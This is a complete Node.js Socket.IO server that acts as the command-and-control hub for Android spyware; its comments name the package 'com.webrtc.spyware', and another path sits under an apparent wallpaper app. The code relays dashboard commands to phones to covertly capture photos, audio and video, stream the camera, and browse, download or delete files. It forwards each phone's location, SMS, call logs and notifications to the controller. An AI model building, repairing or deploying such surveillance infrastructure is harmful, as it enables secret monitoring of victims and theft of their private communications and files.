/**
 * WebRTC Signaling Server — Unified Protocol v2.2
 *
 * Handles BOTH signaling dialects:
 *   • Java path  (com.example.wallpaperapplication / StreamingService.java)
 *     Android emits : identify, signal  {to, from, signal:{type,sdp}} / {to,from,signal:{candidate}}
 *     Android listens: web-client-ready, signal, web-client-disconnected, start-stream
 *
 *   • Kotlin path (com.webrtc.spyware / SpywareService.kt + SocketManager.kt)
 *     Android emits : register-device {deviceId}
 *     Android listens: start-stream, capture-image, capture-audio, capture-video
 *
 *   • Dashboard (PHP index.php JS)
 *     Browser emits : join-as-controller {deviceId}, offer, answer, ice-candidate, signal,
 *                     capture-image, capture-audio, capture-video
 *     Browser listens: device-list-update, start-stream, offer, answer, ice-candidate,
 *                      signal, web-client-ready, media-ready, location, sms, call_log,
 *                      notification, fs:list_result, fs:download_start,
 *                      fs:download_chunk, fs:download_complete
 *
 * v2.2 changes:
 *   FIX Bug 7 — maxHttpBufferSize raised to 50 MB so large video Base64
 *               payloads (30s @ 3Mbps = ~15 MB after encoding) are not
 *               silently dropped by Socket.IO's default 1 MB limit.
 */

'use strict';

const express = require('express');
const http    = require('http');
const { Server } = require('socket.io');
const cors    = require('cors');

const app    = express();
const server = http.createServer(app);
const io     = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  pingTimeout:      60000,
  pingInterval:     25000,
  // FIX Bug 7: default is 1e6 (1 MB) — too small for video Base64.
  // 30s video @ 3 Mbps = ~11 MB raw; Base64 adds 33% = ~15 MB.
  // Set to 50 MB to handle all capture types with headroom.
  maxHttpBufferSize: 50e6
});

app.use(cors());
app.use(express.json());

app.get('/',       (_req, res) => res.json({ status: 'ok', version: '2.2.0', protocol: 'unified' }));
app.get('/health', (_req, res) => res.json({ status: 'ok', devices: Object.keys(deviceSockets).length }));

/**
 * State maps
 * deviceSockets : deviceId  -> socket.id
 * controllerOf  : socket.id -> deviceId
 * socketType    : socket.id -> 'device' | 'controller'
 */
const deviceSockets = {};
const controllerOf  = {};
const socketType    = {};

function broadcastDeviceList() {
  io.emit('device-list-update', Object.keys(deviceSockets));
}

io.on('connection', (socket) => {
  console.log(`[+] ${socket.id}`);

  // ── Java path: identify (‘android’) ────────────────────────────────────────
  socket.on('identify', (type) => {
    if (type === 'android') {
      const deviceId = socket.id;
      deviceSockets[deviceId] = socket.id;
      socketType[socket.id]   = 'device';
      socket.join(`device_${deviceId}`);
      console.log(`[device:java] ${deviceId}`);
      broadcastDeviceList();
    }
  });

  // ── Kotlin path: register-device {deviceId} ──────────────────────────────
  socket.on('register-device', (data) => {
    const deviceId = (data && data.deviceId) ? data.deviceId : socket.id;
    deviceSockets[deviceId] = socket.id;
    socketType[socket.id]   = 'device';
    socket.join(`device_${deviceId}`);
    console.log(`[device:reg] ${deviceId}`);
    broadcastDeviceList();
  });

  // ── Dashboard: join-as-controller ───────────────────────────────────────
  socket.on('join-as-controller', (data) => {
    const deviceId = data && data.deviceId;
    if (!deviceId) return;
    socketType[socket.id]   = 'controller';
    controllerOf[socket.id] = deviceId;
    socket.join(`ctrl_${deviceId}`);
    console.log(`[ctrl] ${socket.id} → device ${deviceId}`);
    io.to(`device_${deviceId}`).emit('web-client-ready',  { webClientId: socket.id, deviceId });
    io.to(`device_${deviceId}`).emit('start-stream',      { controllerId: socket.id, deviceId });
  });

  // ── WebRTC Signaling: unified signal event ────────────────────────────
  socket.on('signal', (data) => {
    if (!data || !data.to) return;
    io.to(data.to).emit('signal', { ...data, from: socket.id });
  });

  // ── WebRTC Signaling: legacy offer/answer/ice-candidate ─────────────────
  socket.on('offer', (data) => {
    if (!data || !data.to) return;
    io.to(data.to).emit('offer',  { sdp: data.sdp, from: socket.id });
    io.to(data.to).emit('signal', { to: data.to, from: socket.id, signal: { type: 'offer',  sdp: data.sdp } });
  });
  socket.on('answer', (data) => {
    if (!data || !data.to) return;
    io.to(data.to).emit('answer', { sdp: data.sdp, from: socket.id });
    io.to(data.to).emit('signal', { to: data.to, from: socket.id, signal: { type: 'answer', sdp: data.sdp } });
  });
  socket.on('ice-candidate', (data) => {
    if (!data || !data.to) return;
    io.to(data.to).emit('ice-candidate', { candidate: data.candidate, from: socket.id });
    io.to(data.to).emit('signal', { to: data.to, from: socket.id, signal: { candidate: data.candidate } });
  });

  // ── Capture commands: Dashboard → Device ──────────────────────────────
  socket.on('capture-image', (data) => {
    const did = data && data.deviceId; if (!did) return;
    io.to(`device_${did}`).emit('capture-image', { camera: data.camera || 'front', deviceId: did });
  });
  socket.on('capture-audio', (data) => {
    const did = data && data.deviceId; if (!did) return;
    io.to(`device_${did}`).emit('capture-audio', { duration: data.duration || 10, deviceId: did });
  });
  socket.on('capture-video', (data) => {
    const did = data && data.deviceId; if (!did) return;
    io.to(`device_${did}`).emit('capture-video', { duration: data.duration || 15, camera: data.camera || 'back', deviceId: did });
  });

  // ── Media result: Device → Dashboard ─────────────────────────────────
  socket.on('media-captured', (data) => {
    const did = data && data.deviceId; if (!did) return;
    io.to(`ctrl_${did}`).emit('media-ready', data);
  });

  // ── Data streams: Device → Dashboard ─────────────────────────────────
  socket.on('location',     (data) => { const did = data && (data.deviceId || data.from); if (did) io.to(`ctrl_${did}`).emit('location',     data); });
  socket.on('sms',          (data) => { const did = data && (data.deviceId || data.from); if (did) io.to(`ctrl_${did}`).emit('sms',          data); });
  socket.on('call_log',     (data) => { const did = data && (data.deviceId || data.from); if (did) io.to(`ctrl_${did}`).emit('call_log',     data); });
  socket.on('notification', (data) => { const did = data && (data.deviceId || data.from); if (did) io.to(`ctrl_${did}`).emit('notification', data); });

  // ── File explorer relay ──────────────────────────────────────────────
  socket.on('fs:list',           (data) => { const did = data && data.deviceId; if (did) io.to(`device_${did}`).emit('fs:list', data); });
  socket.on('fs:list_result',    (data) => { const to  = data && data.to;       if (to)  io.to(to).emit('fs:list_result', data); });
  socket.on('fs:download',       (data) => { const did = data && data.deviceId; if (did) io.to(`device_${did}`).emit('fs:download', data); });
  socket.on('fs:download_start',    (d) => { if (d && d.to) io.to(d.to).emit('fs:download_start',    d); });
  socket.on('fs:download_chunk',    (d) => { if (d && d.to) io.to(d.to).emit('fs:download_chunk',    d); });
  socket.on('fs:download_complete', (d) => { if (d && d.to) io.to(d.to).emit('fs:download_complete', d); });
  socket.on('fs:download_error',    (d) => { if (d && d.to) io.to(d.to).emit('fs:download_error',    d); });
  socket.on('fs:download_ready',    (d) => { if (d && d.deviceId) io.to(`device_${d.deviceId}`).emit('fs:download_ready', d); });
  socket.on('fs:delete',         (data) => { const did = data && data.deviceId; if (did) io.to(`device_${did}`).emit('fs:delete', data); });

  // ── Device control commands ────────────────────────────────────────────
  socket.on('torch',         (data) => { const did = data && data.deviceId; if (did) io.to(`device_${did}`).emit('torch',         { on: !!data.on }); });
  socket.on('switch_camera', (data) => { const did = data && data.deviceId; if (did) io.to(`device_${did}`).emit('switch_camera', {}); });

  // ── Disconnect cleanup ─────────────────────────────────────────────────
  socket.on('disconnect', () => {
    console.log(`[-] ${socket.id}`);
    for (const [did, sid] of Object.entries(deviceSockets)) {
      if (sid === socket.id) {
        delete deviceSockets[did];
        io.to(`ctrl_${did}`).emit('web-client-disconnected', { webClientId: socket.id, deviceId: did });
        broadcastDeviceList();
        break;
      }
    }
    const deviceId = controllerOf[socket.id];
    if (deviceId) {
      io.to(`device_${deviceId}`).emit('web-client-disconnected', { webClientId: socket.id, deviceId });
      delete controllerOf[socket.id];
    }
    delete socketType[socket.id];
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Unified signaling server v2.2 on port ${PORT}`));
